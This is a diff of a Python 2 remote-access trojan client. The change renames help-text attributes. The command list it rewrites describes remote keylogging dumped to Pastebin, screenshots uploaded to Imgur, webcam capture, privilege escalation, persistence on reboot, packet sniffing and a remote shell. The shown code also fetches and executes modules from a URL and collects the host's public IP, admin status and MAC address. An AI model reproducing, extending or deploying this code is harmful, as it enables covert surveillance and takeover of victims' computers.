@@ -88,50 +88,47 @@ class Client(object):
 
     def __init__(self, **kwargs):
         self._setup(**kwargs)
-        self._mode       = 0
-        self._exit       = 0
-        self._threads    = {}
-        self._info       = self._get_info()
-        self._logger     = self._get_logger()
-        self._modules    = {mod: getattr(self, mod) for mod in __modules__}
-        self._commands   = {cmd: getattr(self, cmd) for cmd in __command__}
-        self._result     = self._get_result()
+        self._mode                      = 0
+        self._exit                      = 0
+        self._threads                   = {}
+        self._info                      = self._get_info()
+        self._logger                    = self._get_logger()
+        self._modules                   = {mod: getattr(self, mod) for mod in __modules__}
+        self._commands                  = {cmd: getattr(self, cmd) for cmd in __command__}
+        self._result                    = self._get_result()
+        self.ls.func_doc                = "usage:         ls <path>\ndescription:   list directory contents"
+        self.cd.func_doc                = "usage:         cd <path>\ndescription:   change directory"
+        self.set.func_doc               = "usage:         set <module> [option]=[value]\ndescription:   set module option"
+        self.new.func_doc               = "usage:         new <url>\ndescription:   download new module from url"
+        self.run.func_doc               = "usage:         run\ndescription:   run enabled client modules"
+        self.pwd.func_doc               = "usage:         pwd \ndescription:   present working directory"
+        self.jobs.func_doc              = "usage:         jobs\ndescription:   list currently active jobs"
+        self.kill.func_doc              = "usage:         kill\ndescription:   kill client"
+        self.show.func_doc              = "usage:         show <option>\ndescription:   show client attributes"
+        self.admin.func_doc             = "usage:         admin\ndescription:   attempt to escalate privileges"
+        self.shell.func_doc             = "usage:         shell\ndescription:   run client shell "
+        self.start.func_doc             = "usage:         start\ndescription:   start client"
+        self.wget.func_doc              = "usage:         wget <url>\ndescription:   download file from url"
+        self.webcam.func_doc            = "usage:         webcam\ndescription:   remote image/video capture from client webcam"
+        self.enable.func_doc            = "usage:         enable <module>\ndescription:   enable module"
+        self.standby.func_doc           = "usage:         standby\ndescription:    revert to standby mode"
+        self.options.func_doc           = "usage:         options\ndescription:   display module options"
+        self.disable.func_doc           = "usage:         disable <module>\ndescription:   disable module"
+        self.results.func_doc           = "usage:         results\ndescription:   show all modules output"
+        self.commands.func_doc          = "usage:         commands\ndescription:   list commands with descriptions"
+        self.keylogger.func_doc         = "usage:         keylogger\ndescription:   log client keystrokes remotely + dump to Pastebin"
+        self.screenshot.func_doc        = "usage:         screenshot\ndescription:   take screenshot + upload to Imgur"
+        self.persistence.func_doc       = "usage:         persistence\ndescription:   establish persistence to relaunch on reboot"
+        self.packetsniffer.func_doc     = "usage:         packetsniffer\ninfo:\tcapture client network traffic + dump to Pastebin"
 
-# ------------------- usage help -------------------------
 
-    def _help(self): return getattr(self, target).usage if target in self._commands else "'{}' not found".format(target)
+    # ------------------- private functions -------------------------
+
+    def _help(self): return getattr(self, target).func_doc if target in self._commands else "'{}' not found".format(target)
     
     def _help_modules(self): return self._show({mod: self._modules[mod].status for mod in self._modules})
 
-    def _help_commands(self): return self._show({cmd: self._commands[cmd].usage for cmd in self._commands})
-
-    def _usage(self):
-        self.ls.usage               = "usage:         ls <path>\ndescription:   list directory contents"
-        self.cd.usage               = "usage:         cd <path>\ndescription:   change directory"
-        self.set.usage              = "usage:         set <module> [option]=[value]\ndescription:   set module option"
-        self.new.usage              = "usage:         new <url>\ndescription:   download new module from url"
-        self.run.usage              = "usage:         run\ndescription:   run enabled client modules"
-        self.pwd.usage              = "usage:         pwd \ndescription:   present working directory"
-        self.jobs.usage             = "usage:         jobs\ndescription:   list currently active jobs"
-        self.kill.usage             = "usage:         kill\ndescription:   kill client"
-        self.show.usage             = "usage:         show <option>\ndescription:   show client attributes"
-        self.wget.usage             = "usage:         wget <url>\ndescription:   download file from url"
-        self.admin.usage            = "usage:         admin\ndescription:   attempt to escalate privileges"
-        self.shell.usage            = "usage:         shell\ndescription:   run client shell "
-        self.start.usage            = "usage:         start\ndescription:   start client"
-        self.webcam.usage           = "usage:         webcam\ndescription:   remote image/video capture from client webcam"
-        self.enable.usage           = "usage:         enable <module>\ndescription:   enable module"
-        self.standby.usage          = "usage:         standby\ndescription:    revert to standby mode"
-        self.options.usage          = "usage:         options\ndescription:   display module options"
-        self.disable.usage          = "usage:         disable <module>\ndescription:   disable module"
-        self.results.usage          = "usage:         results\ndescription:   show all modules output"
-        self.commands.usage         = "usage:         commands\ndescription:   list commands with descriptions"
-        self.keylogger.usage        = "usage:         keylogger\ndescription:   log client keystrokes remotely + dump to Pastebin"
-        self.screenshot.usage       = "usage:         screenshot\ndescription:   take screenshot + upload to Imgur"
-        self.persistence.usage      = "usage:         persistence\ndescription:   establish persistence to relaunch on reboot"
-        self.packetsniffer.usage    = "usage:         packetsniffer\ndescription:   capture client network traffic + dump to Pastebin"
-
-# ------------------- private functions -------------------------
+    def _help_commands(self): return self._show({cmd: self._commands[cmd].func_doc for cmd in self._commands})
 
     def _wget(self, target): return urlretrieve(target)[0]
     
@@ -147,7 +144,7 @@ class Client(object):
 
     def _ls(self, *path): return '\n'.join(os.listdir(path[0])) if path else '\n'.join(os.listdir('.'))
 
-    def _setup(self, **kwargs): return [setattr(self, '__{}__'.format(chr(i)), kwargs.get('__{}__'.format(chr(i)))) for i in range(97,123) if '__{}__'.format(chr(i)) in kwargs] + [self._usage()]
+    def _setup(self, **kwargs): return [setattr(self, '__{}__'.format(chr(i)), kwargs.get('__{}__'.format(chr(i)))) for i in range(97,123) if '__{}__'.format(chr(i)) in kwargs]
 
     def _get_info(self): return {k:v for k,v in zip(['Platform', 'Machine', 'Version','Release', 'Family', 'Processor', 'IP Address','Login', 'Admin', 'MAC Address'], [i for i in uname()] + [urlopen('http://api.ipify.org').read(), socket.gethostbyname(socket.gethostname()), bool(os.getuid() == 0 if os.name is 'posix' else windll.shell32.IsUserAnAdmin()), '-'.join(uuid1().hex[20:].upper()[i:i+2] for i in range(0,11,2))])}
 
@@ -484,7 +481,7 @@ class Client(object):
             elif action == 'update':
                 exec module in globals()
         else:
-            return self.new.usage
+            return self.new.func_doc
 
     def _new_module(self, uri, *kwargs):
         try:
@@ -1068,5 +1065,5 @@ class Client(object):
 def main(*args, **kwargs):
     client = Client(**kwargs)
     return client.start()
-   
+
 
